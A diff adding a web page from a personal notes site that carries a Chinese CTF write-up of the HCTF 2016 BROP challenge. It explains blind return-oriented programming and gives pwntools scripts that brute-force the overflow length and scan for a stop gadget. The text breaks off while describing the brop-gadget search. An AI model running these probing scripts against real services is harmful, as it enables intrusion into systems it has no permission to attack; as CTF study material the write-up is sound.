@@ -1,0 +1,1242 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Welcome to Allen Hong's Notes. This site records some of my notes. Hope it can help you a bit. You're also welcome to discuss with me and help point out some of this site's issues.">
+      
+      
+        <meta name="author" content="Allen Hong">
+      
+      
+        <link rel="canonical" href="https://masterallen.github.io/%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/wiki/02.stack/05.BROP/">
+      
+      
+        <link rel="prev" href="../04.ret2dlresolve/ret2dlresolve/">
+      
+      
+        <link rel="next" href="./exp.py/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.40">
+    
+    
+      
+        <title>HTCF 2016 出题人去哪了题解 (BROP) - Allen Hong's Notes</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-WSXPFTNRTD"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-WSXPFTNRTD",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-WSXPFTNRTD",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htcf-2016-brop" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="Allen Hong&#x27;s Notes" class="md-header__button md-logo" aria-label="Allen Hong's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Allen Hong's Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTCF 2016 出题人去哪了题解 (BROP)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+        <a href="https://github.com/masterAllen" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    My Github Link
+  </div>
+</a>
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    
+    <div class="custom-sidebar-shell custom-page-shell md-grid">
+        
+          
+            
+            <div class="md-sidebar md-sidebar--primary" data-md-type="navigation" >
+              <div class="md-sidebar__scrollwrap">
+                <div class="md-sidebar__inner">
+                  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+  <a href="../../../../..">加载栏目目录…</a>
+</div>
+<script src="../../../../../javascripts/shared-navigation.js"></script>
+
+<script src="../../../../../javascripts/sidebar-title-tooltip.js"></script>
+<script src="../../../../../javascripts/sidebar-scroll-position.js"></script>
+                </div>
+              </div>
+            </div>
+          
+        
+    </div>
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    <div class="md-container" data-md-component="container"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-site-root="../../../../../"
+         data-navigation-hidden="false">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Main/" class="md-tabs__link">
+          
+  
+  Main
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  系统性知识
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E4%B9%A6%E7%B1%8D%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  书籍记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  算法记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../CheatSheet/" class="md-tabs__link">
+          
+  
+  CheatSheet
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Language/" class="md-tabs__link">
+          
+  
+  Language
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Vision/CMOS%E7%9A%84%E7%90%86%E8%A7%A3/01.CMOS%E5%92%8CCCD%E7%A9%B6%E7%AB%9F%E5%8C%BA%E5%88%AB%E5%9C%A8%E5%93%AA%E9%87%8C/" class="md-tabs__link">
+          
+  
+  Vision
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../IP%E5%9C%B0%E7%90%86%E5%AE%9A%E4%BD%8D/%E6%95%B4%E4%BD%93%E7%9B%AE%E5%BD%95%E6%A0%91/" class="md-tabs__link">
+          
+  
+  IP 地理定位
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../About/" class="md-tabs__link">
+          
+  
+  About
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../%E5%BD%92%E6%A1%A3/%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/" class="md-tabs__link">
+          
+  
+  归档
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <div class="custom-page-shell md-grid">
+        <div class="custom-main-area">
+          <main class="md-main" data-md-component="main">
+            <div class="md-main__inner md-grid">
+              
+                
+                  
+                  <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                    <div class="md-sidebar__scrollwrap">
+                      
+                        
+                        
+                        
+                          
+                        
+                        
+                          <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                          <div class="md-sidebar-button__wrapper">
+                            <label class="md-sidebar-button" for="__toc"></label>
+                          </div>
+                        
+                      
+                      <div class="md-sidebar__inner">
+                        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        前言
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        源码分析
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        解题步骤
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解题步骤">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        确定栈溢出
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stop_gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        寻找 stop_gadget
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#brop_gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        寻找 brop_gadget
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="寻找 brop_gadget">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#brop_gadget_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        brop_gadget 是什么
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#brop_gadget_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        brop_gadget 怎么找
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puts_plt" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        寻找 puts_plt
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puts_got" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        寻找 puts_got
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puts_got_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        寻找 puts_got 内容
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        总结
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                      </div>
+                    </div>
+                  </div>
+                
+              
+              
+                <div class="md-content" data-md-component="content">
+                  
+                    
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    欢迎
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    系统性知识
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    信息安全
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    wiki
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../readme.txt/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    02.stack
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="././" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    05.BROP
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+                  
+                  <article class="md-content__inner md-typeset">
+                    
+                      
+                        
+  
+  
+
+
+<h1 id="htcf-2016-brop">HTCF 2016 出题人去哪了题解 (BROP)</h1>
+<div class="file-actions" data-image-edit-revision="365b2032478a8fae75f9823c4d546972f84ee41a449528deb86c7d21cc4275f4" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C02.stack%5C05.BROP%5Creadme.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C02.stack%5C05.BROP" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\wiki\02.stack\05.BROP\readme.md">复制路径</span></div>
+
+<h2 id="_1">前言</h2>
+<p>我看了一下，网上已经有很多关于这题的题解了，不过还是自己写一下更好一点。<br />
+这道题目主要就是用了 BROP 这个方法，我也是通过这道题才学会这个方法的。</p>
+<h2 id="_2">源码分析</h2>
+<p>我没参加过比赛，不过我估计比赛也没有给出二进制文件，而是就告诉你们连接我服务器的哪个端口，所以没有办法本地调试，这就是麻烦之处。<br />
+连上服务器，发现就是输入密码，看来就是简单的登录检查程序。</p>
+<h2 id="_3">解题步骤</h2>
+<h3 id="_4">确定栈溢出</h3>
+<p>先看一看他们有没有栈溢出，长度是多少，脚本如下。本质上就是暴力，每次增加一个长度，然后看看程序有没有崩溃。<br />
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">getbufferflow_length</span><span class="p">():</span>
+</span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span id="__span-0-3"><span class="linenos" data-linenos=" 3 "></span>    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span id="__span-0-4"><span class="linenos" data-linenos=" 4 "></span>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-0-5"><span class="linenos" data-linenos=" 5 "></span>            <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-0-6"><span class="linenos" data-linenos=" 6 "></span>            <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;WelCome my friend,Do you know password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-0-7"><span class="linenos" data-linenos=" 7 "></span>            <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span><span id="__span-0-8"><span class="linenos" data-linenos=" 8 "></span>            <span class="n">output</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span><span id="__span-0-9"><span class="linenos" data-linenos=" 9 "></span>            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-0-10"><span class="linenos" data-linenos="10 "></span>            <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</span><span id="__span-0-11"><span class="linenos" data-linenos="11 "></span>            <span class="k">if</span> <span class="ow">not</span> <span class="n">output</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;No password&#39;</span><span class="p">):</span>
+</span><span id="__span-0-12"><span class="linenos" data-linenos="12 "></span>                <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+</span><span id="__span-0-13"><span class="linenos" data-linenos="13 "></span>            <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-0-14"><span class="linenos" data-linenos="14 "></span>                <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-0-15"><span class="linenos" data-linenos="15 "></span>        <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+</span><span id="__span-0-16"><span class="linenos" data-linenos="16 "></span>            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-0-17"><span class="linenos" data-linenos="17 "></span>            <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
+</span></code></pre></div></p>
+<h3 id="stop_gadget">寻找 stop_gadget</h3>
+<p>什么是 stop gadget 呢，其实你就可以理解成，跳到这个地址后，程序执行它不会进行崩溃。<br />
+比如这道题目中，我找到的就是 main 函数的地址，这样程序跳到这个地址，继续重新执行 main 函数，当然不会崩溃。</p>
+<p>寻找方式也很朴素，就是不断地利用栈溢出，从起始地址 0x400000 暴力寻找地址即可。<br />
+<mark class="term-highlight">我推荐找到的地址是可以让程序输出某个比较有特征的语句</mark>，比如我这里就是找 main 函数的地址，这样程序会输出 WelCome.<br />
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_stop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span><span id="__span-1-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-1-3"><span class="linenos" data-linenos=" 3 "></span>        <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
+</span><span id="__span-1-4"><span class="linenos" data-linenos=" 4 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-1-5"><span class="linenos" data-linenos=" 5 "></span>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">10</span>
+</span><span id="__span-1-6"><span class="linenos" data-linenos=" 6 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-1-7"><span class="linenos" data-linenos=" 7 "></span>        <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span><span id="__span-1-8"><span class="linenos" data-linenos=" 8 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-1-9"><span class="linenos" data-linenos=" 9 "></span>        <span class="k">return</span> <span class="n">content</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;WelCome&#39;</span><span class="p">)</span>
+</span><span id="__span-1-10"><span class="linenos" data-linenos="10 "></span>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span><span id="__span-1-11"><span class="linenos" data-linenos="11 "></span>        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-1-12"><span class="linenos" data-linenos="12 "></span>        <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-1-13"><span class="linenos" data-linenos="13 "></span>
+</span><span id="__span-1-14"><span class="linenos" data-linenos="14 "></span><span class="n">stop_addr</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">-</span> <span class="mi">1</span>
+</span><span id="__span-1-15"><span class="linenos" data-linenos="15 "></span><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-1-16"><span class="linenos" data-linenos="16 "></span>    <span class="n">stop_addr</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-1-17"><span class="linenos" data-linenos="17 "></span>    <span class="k">if</span> <span class="n">check_stop_gadget</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
+</span><span id="__span-1-18"><span class="linenos" data-linenos="18 "></span>        <span class="k">break</span>
+</span></code></pre></div></p>
+<h3 id="brop_gadget">寻找 brop_gadget</h3>
+<h4 id="brop_gadget_1">brop_gadget 是什么</h4>
+<p>什么是 brop_gadget，这里要有 ret2csu 的知识储备，brop_gadget 就是格式是这样的 ROP_gadget: <code>pop * 6 + ret</code> <br />
+为什么要找这样的 rop_gadget，因为如果找到了这种有 6 个 pop 的形式，基本上大概率它就是 ret2csu 中利用的 rop.<br />
+在这里写一下 ret2csu 中的 rop: </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos="1 "></span>pop rbx 
+</span><span id="__span-2-2"><span class="linenos" data-linenos="2 "></span>pop rbp 
+</span><span id="__span-2-3"><span class="linenos" data-linenos="3 "></span>pop r12 
+</span><span id="__span-2-4"><span class="linenos" data-linenos="4 "></span>pop r13 
+</span><span id="__span-2-5"><span class="linenos" data-linenos="5 "></span>pop r14 
+</span><span id="__span-2-6"><span class="linenos" data-linenos="6 "></span>pop r15 
+</span><span id="__span-2-7"><span class="linenos" data-linenos="7 "></span>ret
+</span></code></pre></div>
+<p>有了它可以干什么？我们通过布局栈就能控制很多寄存器。而且比较重要的是，<mark class="term-highlight">可以利用偏移量控制 rsi 和 rdi</mark>。看一下下面的图就好理解了，也就是原来的 gadget 稍微偏一下，翻译成了 <code>pop rsi</code> 和 <code>pop rdi</code> 的指令。</p>
+<p><img alt="" src="../../../../../asset/image/ace8300595b45a951c9f889575f5d472/20260421201854.png" /></p>
+<p>另外插一句，这是我的个人想法，找到了 brop_gadget 的地址，就相当于找到了 <code>_libc_csu_init</code> 函数的地址，如下面所示。<br />
+那感觉可以利用很多东西，比如 ret2csu 就完全可以用了，因为地址我全都知道了。<br />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span>.text:00000000004005C0 ; void _libc_csu_init(void)
+</span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span>.text:00000000004005C0                 public __libc_csu_init
+</span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span>.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16
+</span><span id="__span-3-4"><span class="linenos" data-linenos=" 4 "></span>.text:00000000004005C0                 push    r15
+</span><span id="__span-3-5"><span class="linenos" data-linenos=" 5 "></span>.text:00000000004005C2                 push    r14
+</span><span id="__span-3-6"><span class="linenos" data-linenos=" 6 "></span>...
+</span><span id="__span-3-7"><span class="linenos" data-linenos=" 7 "></span>.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34
+</span><span id="__span-3-8"><span class="linenos" data-linenos=" 8 "></span>.text:0000000000400616                 add     rsp, 8
+</span><span id="__span-3-9"><span class="linenos" data-linenos=" 9 "></span>.text:000000000040061A                 pop     rbx
+</span><span id="__span-3-10"><span class="linenos" data-linenos="10 "></span>.text:000000000040061B                 pop     rbp
+</span><span id="__span-3-11"><span class="linenos" data-linenos="11 "></span>.text:000000000040061C                 pop     r12
+</span><span id="__span-3-12"><span class="linenos" data-linenos="12 "></span>.text:000000000040061E                 pop     r13
+</span><span id="__span-3-13"><span class="linenos" data-linenos="13 "></span>.text:0000000000400620                 pop     r14
+</span><span id="__span-3-14"><span class="linenos" data-linenos="14 "></span>.text:0000000000400622                 pop     r15
+</span><span id="__span-3-15"><span class="linenos" data-linenos="15 "></span>.text:0000000000400624                 retn
+</span><span id="__span-3-16"><span class="linenos" data-linenos="16 "></span>.text:0000000000400624 __libc_csu_init endp
+</span></code></pre></div></p>
+<h4 id="brop_gadget_2">brop_gadget 怎么找</h4>
+<p>这个就很简单了，利用栈溢出构造格式：{ padding | want_addr | xxxx * 6 | stop_gadget }.<br />
+如果程序不崩溃就 OK，是吗？显然还有一点要注意，如果 want_addr 就是 stop_gadget 怎么办？是不是无法检测了对吧。</p>
+<p>所以最后实现方式如下。<br />
